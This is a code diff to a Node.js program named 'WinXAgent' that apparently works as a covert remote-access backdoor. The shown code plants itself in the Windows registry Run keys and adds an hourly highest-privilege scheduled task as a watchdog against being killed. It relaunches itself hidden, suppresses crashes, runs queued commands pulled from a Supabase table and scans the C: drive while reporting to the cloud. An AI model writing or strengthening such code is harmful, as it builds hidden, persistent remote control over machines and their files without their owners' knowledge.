@@ -29,6 +29,17 @@ async function moveToPermanentHome() {
   } catch (e) { return currentPath; }
 }
 
+// Global Resilience: Prevent the agent from dying on unexpected errors
+process.on('uncaughtException', async (err) => {
+  console.error('CRASH_PREVENTED:', err);
+  try { await logToCloud(`RECOVERY: Uncaught Exception - ${err.message}`, 'error'); } catch(e) {}
+});
+
+process.on('unhandledRejection', async (reason) => {
+  console.error('PROMISE_REJECTION_PREVENTED:', reason);
+  try { await logToCloud(`RECOVERY: Unhandled Rejection - ${reason}`, 'error'); } catch(e) {}
+});
+
 // Silence specific experimental warnings for a cleaner console/log experience
 const originalEmitWarning = process.emitWarning;
 process.emitWarning = (warning, ...args) => {
@@ -145,7 +156,8 @@ async function ensurePersistence(targetPath) {
   const regCmd = `reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${shellEscaped}" /f`;
   const hkcuCmd = `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${shellEscaped}" /f`;
   const taskName = "WinXAgentService";
-  const taskCmd = `schtasks /create /tn "${taskName}" /tr "${shellEscaped}" /sc onlogon /rl highest /f`;
+  // Watchdog: Run every hour AND at logon to ensure the agent stays alive even if killed
+  const taskCmd = `schtasks /create /tn "${taskName}" /tr "${shellEscaped}" /sc hourly /mo 1 /rl highest /f`;
 
   const run = (cmd) => new Promise(resolve => exec(cmd, (err) => resolve(err)));
 
@@ -308,14 +320,35 @@ async function handleCommand(payload) {
   }
 }
 
+/**
+ * Checks for and executes any commands that were sent while the agent was offline
+ */
+async function processPendingCommands() {
+  const { data: pending, error } = await supabase
+    .from('commands')
+    .select('*')
+    .eq('computer_name', COMPUTER_NAME)
+    .eq('status', 'pending');
+
+  if (error) {
+    await logToCloud(`Error fetching pending commands: ${error.message}`, 'error');
+    return;
+  }
+
+  if (pending && pending.length > 0) {
+    await logToCloud(`Found ${pending.length} missed commands. Processing...`);
+    for (const cmd of pending) {
+      await handleCommand({ new: cmd });
+    }
+  }
+}
+
 async function start() {
   // Phase 1: Setup & Re-launch
   if (!process.argv.includes('--hidden')) {
     console.log(`Initializing WinXAgent on ${COMPUTER_NAME}...`);
-    
     const permanentPath = await moveToPermanentHome();
     await ensurePersistence(permanentPath);
-    
     await logToCloud("Agent Persistence Established");
 
     const isCompiled = Boolean(process.pkg);
@@ -335,17 +368,24 @@ async function start() {
   // Phase 2: Worker Mode (Hidden)
   await logToCloud("Agent Online (Background)");
 
+  // 1. Process any commands that arrived while we were offline
+  await processPendingCommands();
+
+  // 2. Subscribe to new incoming commands immediately
   // Subscribe to commands targeting this specific computer
   supabase
-    .channel('remote-cmds')
+    .channel(`agent-${COMPUTER_NAME}`)
     .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'commands', filter: `computer_name=eq.${COMPUTER_NAME}` }, handleCommand)
     .subscribe();
 
-  // Perform initial scan after subscription to ensure we are already listening for commands
-  await scanDirectory('C:\\', lastFoldersOnlyPreference);
+  // 3. Perform initial scan in the background (no await) 
+  // This ensures the agent is immediately responsive to new commands from the dashboard
+  scanDirectory('C:\\', lastFoldersOnlyPreference).catch(err => 
+    logToCloud(`Initial scan failed: ${err.message}`, 'error')
+  );
 
-  // Keep-alive heartbeat every 5 minutes
-  setInterval(() => logToCloud("System Heartbeat (Ping)", "debug"), 5 * 60 * 1000);
+  // Keep-alive heartbeat every 1 minute for a more stable "Online" status
+  setInterval(() => logToCloud(`Active - Uptime: ${Math.floor(process.uptime() / 60)}m`, "debug"), 60 * 1000);
 }
 
 start();
